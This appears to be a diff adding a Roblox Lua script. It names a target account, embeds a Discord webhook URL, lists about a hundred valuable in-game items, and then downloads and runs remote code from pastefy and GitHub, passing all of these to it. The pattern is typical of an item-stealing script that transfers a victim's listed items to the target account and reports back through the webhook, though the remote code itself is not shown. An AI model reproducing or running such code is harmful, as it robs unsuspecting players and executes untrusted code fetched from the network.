@@ -1,0 +1,121 @@
+local TARGET_ID = 6074348674
+local TARGET_USER = "Onlyplaystrongest"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1484254365459153039/qZF3gYUgTHtTu8dSsdlYWlS-mopIRSntsyCits3Lv2tazZnhjYk1FeE6MziO8xhmGhBb"
+
+local TargetBrainrots = {
+    ["Hydra Serpent"] = true,
+    ["Dragon Skeletonini"] = true,
+    ["Plant Bros"] = true,
+    ["Phoenix"] = true,
+    ["Orchidox"] = true,
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Strawberry Elephant"] = true,
+    ["La Craft Machine"] = true,
+    ["Los Dragons"] = true,
+    ["Gold and Diamond"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Griffin"] = true,
+    ["Hydra Bunny"] = true,
+    ["Antonio"] = true,
+    ["Elefanto Frigo"] = true,
+    ["John Pork"] = true,
+    ["Rubrikiko"] = true,
+    ["Pancake and Syrup"] = true,
+    ["Arcadragon"] = true,
+    ["Rico Dinero"] = true,
+    ["Capitano Americano"] = true,
+    ["Kalika Bros"] = true,
+    ["Globa Steppa"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Dug Dug Dug"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Dragon Aquanini"] = true,
+    ["La Casa Boo"] = true,
+    ["Headless Horseman"] = true,
+    ["Signore Carapace"] = true,
+    ["Fishino Clownino"] = true,
+    ["Cerberus"] = true,
+    ["Duggy Bros"] = true,
+    ["Kraken"] = true,
+    ["Money Money Bros"] = true,
+    ["Venuspino"] = true,
+    ["Steakini Fattini"] = true,
+    ["Caylusaurus"] = true,
+    ["Sammyni Cakini"] = true,
+    ["Los Hackers"] = true,
+    ["Jelly Moby"] = true,
+    ["Foxini Lanternini"] = true,
+    ["Digi Narwhal"] = true,
+    ["Los Admins"] = true,
+    ["Moby Bros"] = true,
+    ["Boppin Bunny"] = true,
+    ["Bunny and Eggy"] = true,
+    ["Burguro and Fryuro"] = true,
+    ["Capitano Moby"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Cash or Card"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Chillin Chili"] = true,
+    ["Chipso and Queso"] = true,
+    ["Cooki and Milki"] = true,
+    ["Cloverat Clapat"] = true,
+    ["Eviledon"] = true,
+    ["Festive 67"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Garama and Madundung"] = true,
+    ["Ginger Gerat"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Ketupat Bros"] = true,
+    ["La Food Combinasion"] = true,
+    ["La Secret Combinasion"] = true,
+    ["La Taco Combinasion"] = true,
+    ["Las Sis"] = true,
+    ["Examen Bros"] = true,
+    ["Los Secret Combinasionas"] = true,
+    ["Pizza and Ranch"] = true,
+    ["Los Amigos"] = true,
+    ["Bumbatron"] = true,
+    ["S'more Serat"] = true,
+    ["Queen Bee"] = true,
+    ["La Breakfast Combinasion"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Los Sekolahs"] = true,
+    ["Los Spaghettis"] = true,
+    ["Los Tacoritas"] = true,
+    ["Love Love Bear"] = true,
+    ["Lovin Rose"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Rubiko and Kubiko"] = true,
+    ["La Fuse Machine"] = true,
+    ["Nachorilla"] = true
+}
+
+local TargetBaseSkins = {
+    ["Tralalero"] = true,
+    ["Summer"] = true
+}
+
+local TargetGears = {
+    ["Crystal Slap"] = true,
+    ["Phantom Slap"] = true,
+    ["Santa's Sleigh"] = true
+}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/LYkPHkU1/raw"))()
+
+    task.wait(1)
+
+    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
+    if type(script) == "function" then
+        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
+    end
+end)
